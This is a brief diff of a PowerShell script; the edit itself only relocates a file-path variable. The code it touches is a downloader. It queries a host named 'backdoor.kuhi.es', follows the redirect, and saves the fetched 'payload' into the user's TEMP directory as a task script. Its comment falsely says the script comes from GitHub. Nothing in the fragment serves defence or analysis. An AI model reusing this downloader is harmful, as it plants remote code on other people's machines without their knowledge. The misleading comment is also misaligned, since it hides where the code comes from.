@@ -4,12 +4,13 @@ if (-not $dc) {
     exit
 }
 
+$destino = "$env:TEMP\Powershell\PowershellTask.ps1"
+
 # Function to save the powershell script from a URL in raw format from GitHub
 function Save-Script {
     try {
         $response = Invoke-WebRequest -Uri "http://backdoor.kuhi.es" -MaximumRedirection 0 -ErrorAction Ignore
         $url = $response.Headers.Location
-        $destino = "$env:TEMP\Powershell\PowershellTask.ps1"        
         New-Item -ItemType Directory -Force -Path "$env:TEMP\Powershell"
         Invoke-WebRequest -Uri $url -OutFile $destino       
         Write-Output "Downloaded payload to $destino" 
